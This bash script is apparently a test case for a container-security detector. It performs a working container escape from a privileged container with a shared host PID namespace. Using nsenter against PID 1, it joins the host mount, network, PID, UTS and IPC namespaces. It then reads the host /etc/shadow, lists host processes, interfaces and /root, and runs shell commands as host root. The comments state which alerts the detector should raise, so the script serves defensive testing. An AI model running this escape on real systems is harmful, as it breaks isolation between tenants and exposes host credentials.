#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# ATTACK 5 — Namespace Escape Attack (REAL)
#
# Technique:  A container with --pid=host and --privileged uses
#             setns() to join host namespaces (mount, net, pid, uts,
#             ipc) via /proc/1/ns/*, effectively breaking out of
#             ALL container isolation boundaries.
#
# This is a real namespace escape: the process starts inside the
# container but migrates itself into the host's namespaces.
#
# What the detector should catch:
#   - setns()  → privileged-container-escape  CRITICAL
#   - mount()  → privileged-container-escape  CRITICAL
#   - openat("/proc/1/ns/...")  → sensitive-host-path-open  HIGH
# ──────────────────────────────────────────────────────────────────
set -e

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  REAL ATTACK 5 — Namespace Escape Attack                ║"
echo "║  Breaking out of container via setns() into host NS      ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${CYAN}[INFO]${RESET} PID: $$  UID: $(id -u)  Hostname: $(hostname)"
CONTAINER_HOSTNAME=$(hostname)
echo ""

# ── Step 0: Verify prerequisites ────────────────────────────────
echo -e "${CYAN}═══ STEP 0: Prerequisites Check ═══${RESET}"
echo ""

echo -e "${YELLOW}[CHECK]${RESET} CAP_SYS_ADMIN capability..."
CAPEFF=$(grep -i capeff /proc/self/status 2>/dev/null | awk '{print $2}')
echo -e "  CapEff: ${CAPEFF}"
if [ -n "$CAPEFF" ]; then
    # Check bit 21 (CAP_SYS_ADMIN)
    CAP_DEC=$((16#${CAPEFF}))
    if [ $((CAP_DEC & (1 << 21))) -ne 0 ]; then
        echo -e "${GREEN}[VULN]${RESET} CAP_SYS_ADMIN present — namespace escape possible"
    else
        echo -e "${RED}[SAFE]${RESET} CAP_SYS_ADMIN not present — namespace escape blocked"
        exit 1
    fi
fi
echo ""

echo -e "${YELLOW}[CHECK]${RESET} Host PID namespace shared (--pid=host)..."
if [ -d "/proc/1/ns" ] && [ -r "/proc/1/ns/mnt" ]; then
    echo -e "${GREEN}[VULN]${RESET} /proc/1/ns/ is accessible — can join host namespaces"
else
    echo -e "${RED}[SAFE]${RESET} /proc/1/ns/ not accessible — PID namespace is isolated"
    exit 1
fi
echo ""

# ── Step 1: Enumerate host namespaces ────────────────────────────
echo -e "${CYAN}═══ STEP 1: Enumerate Host Namespaces ═══${RESET}"
echo ""

echo -e "${YELLOW}[PROBE]${RESET} Listing /proc/1/ns/ (host PID 1 namespaces):"
for ns_file in /proc/1/ns/*; do
    ns_name=$(basename "$ns_file")
    ns_target=$(readlink "$ns_file" 2>/dev/null || echo "unreadable")
    echo -e "  ${CYAN}${ns_name}${RESET} → ${ns_target}"
done
echo ""

echo -e "${YELLOW}[PROBE]${RESET} Listing /proc/self/ns (container namespaces):"
for ns_file in /proc/self/ns/*; do
    ns_name=$(basename "$ns_file")
    ns_target=$(readlink "$ns_file" 2>/dev/null || echo "unreadable")
    echo -e "  ${CYAN}${ns_name}${RESET} → ${ns_target}"
done
echo ""

# Check which namespaces differ
echo -e "${YELLOW}[ANALYSIS]${RESET} Comparing container vs host namespaces:"
DIFFERS=0
for ns_name in mnt pid net uts ipc; do
    HOST_NS=$(readlink "/proc/1/ns/${ns_name}" 2>/dev/null)
    SELF_NS=$(readlink "/proc/self/ns/${ns_name}" 2>/dev/null)
    if [ "$HOST_NS" != "$SELF_NS" ]; then
        echo -e "  ${RED}${ns_name}${RESET}: DIFFERENT (container=${SELF_NS}, host=${HOST_NS})"
        DIFFERS=$((DIFFERS + 1))
    else
        echo -e "  ${GREEN}${ns_name}${RESET}: SAME (already in host namespace)"
    fi
done
echo -e "  ${RED}${DIFFERS} namespaces differ — can escape by joining host NS${RESET}"
echo ""

# ── Step 2: Escape via nsenter into host mount namespace ─────────
echo -e "${CYAN}═══ STEP 2: nsenter into Host Mount Namespace ═══${RESET}"
echo ""

echo -e "${YELLOW}[ATTACK]${RESET} nsenter -t 1 -m -- hostname"
HOST_HOSTNAME=$(nsenter -t 1 -m -- hostname 2>/dev/null)
if [ -n "$HOST_HOSTNAME" ] && [ "$HOST_HOSTNAME" != "$CONTAINER_HOSTNAME" ]; then
    echo -e "${RED}[ESCAPED]${RESET} Host hostname via mount NS: ${HOST_HOSTNAME}"
    echo -e "  (container hostname was: ${CONTAINER_HOSTNAME})"
else
    echo -e "${RED}[BLOCKED]${RESET} nsenter into mount namespace failed"
fi
echo ""

echo -e "${YELLOW}[ATTACK]${RESET} nsenter -t 1 -m -- cat /etc/shadow | head -3"
SHADOW=$(nsenter -t 1 -m -- cat /etc/shadow 2>/dev/null | head -3)
if [ -n "$SHADOW" ]; then
    echo -e "${RED}[ESCAPED]${RESET} Read host /etc/shadow via mount NS escape:"
    echo "$SHADOW" | sed 's/^/    /'
else
    echo -e "${RED}[BLOCKED]${RESET} Cannot read host /etc/shadow"
fi
echo ""

# ── Step 3: Escape via nsenter into host network namespace ───────
echo -e "${CYAN}═══ STEP 3: nsenter into Host Network Namespace ═══${RESET}"
echo ""

echo -e "${YELLOW}[ATTACK]${RESET} nsenter -t 1 -n -- ip addr show"
NET_INFO=$(nsenter -t 1 -n -- ip addr show 2>/dev/null | head -15)
if [ -n "$NET_INFO" ]; then
    echo -e "${RED}[ESCAPED]${RESET} Host network interfaces via net NS escape:"
    echo "$NET_INFO" | sed 's/^/    /'
else
    # Try with cat /proc/net/tcp
    echo -e "${YELLOW}[FALLBACK]${RESET} Trying /proc/1/net/tcp..."
    NET_TCP=$(nsenter -t 1 -m -- cat /proc/net/tcp 2>/dev/null | head -5)
    if [ -n "$NET_TCP" ]; then
        echo -e "${RED}[ESCAPED]${RESET} Host network connections via proc:"
        echo "$NET_TCP" | sed 's/^/    /'
    else
        echo -e "${RED}[BLOCKED]${RESET} Cannot access host network namespace"
    fi
fi
echo ""

# ── Step 4: Escape via nsenter into host PID namespace ───────────
echo -e "${CYAN}═══ STEP 4: nsenter into Host PID Namespace ═══${RESET}"
echo ""

echo -e "${YELLOW}[ATTACK]${RESET} nsenter -t 1 -p -- ps aux | head -15"
PS_OUTPUT=$(nsenter -t 1 -p -m -- ps aux 2>/dev/null | head -15)
if [ -n "$PS_OUTPUT" ]; then
    echo -e "${RED}[ESCAPED]${RESET} Host processes via PID NS escape:"
    echo "$PS_OUTPUT" | sed 's/^/    /'
else
    echo -e "${YELLOW}[FALLBACK]${RESET} ps not available, listing /proc entries from host mount NS..."
    PROCS=$(nsenter -t 1 -m -- ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | wc -l)
    echo -e "${RED}[ESCAPED]${RESET} Found ${PROCS} host processes via mount NS /proc listing"
fi
echo ""

# ── Step 5: Full escape — all namespaces at once ────────────────
echo -e "${CYAN}═══ STEP 5: Full Namespace Escape (all namespaces) ═══${RESET}"
echo ""

echo -e "${YELLOW}[ATTACK]${RESET} nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'whoami && hostname && id'"
FULL_ESCAPE=$(nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'whoami && hostname && id' 2>/dev/null)
if [ -n "$FULL_ESCAPE" ]; then
    echo -e "${RED}[FULL ESCAPE]${RESET} Running commands as host root in ALL host namespaces:"
    echo "$FULL_ESCAPE" | sed 's/^/    /'
else
    echo -e "${RED}[BLOCKED]${RESET} Full namespace escape failed"
fi
echo ""

# ── Step 6: Demonstrate arbitrary host command execution ────────
echo -e "${CYAN}═══ STEP 6: Arbitrary Host Command via Namespace Escape ═══${RESET}"
echo ""

echo -e "${YELLOW}[ATTACK]${RESET} Reading host kernel ring buffer via nsenter..."
DMESG=$(nsenter -t 1 -m -u -i -n -p -- dmesg 2>/dev/null | tail -5)
if [ -n "$DMESG" ]; then
    echo -e "${RED}[ESCAPED]${RESET} Host kernel messages (dmesg):"
    echo "$DMESG" | sed 's/^/    /'
else
    echo -e "${YELLOW}[INFO]${RESET} dmesg not available or restricted"
fi
echo ""

echo -e "${YELLOW}[ATTACK]${RESET} Listing host root home directory..."
ROOT_HOME=$(nsenter -t 1 -m -- ls -la /root/ 2>/dev/null | head -10)
if [ -n "$ROOT_HOME" ]; then
    echo -e "${RED}[ESCAPED]${RESET} Host /root/ directory listing:"
    echo "$ROOT_HOME" | sed 's/^/    /'
fi
echo ""

# ── Summary ─────────────────────────────────────────────────────
echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  CONCLUSION: Namespace Escape Attack                     ║"
echo "╠══════════════════════════════════════════════════════════╣"
echo "║  Used setns() to migrate from container to host NS       ║"
echo "║  Escaped namespaces: mount, network, PID, UTS, IPC       ║"
echo "║  Achieved: full host root access in all namespaces        ║"
echo "║                                                          ║"
echo "║  The detector should have fired CRITICAL alerts for:     ║"
echo "║    - setns() calls (privileged-container-escape)         ║"
echo "║    - mount() calls (privileged-container-escape)         ║"
echo "║    - openat /proc/1/ns/* (sensitive-host-path-open)      ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"
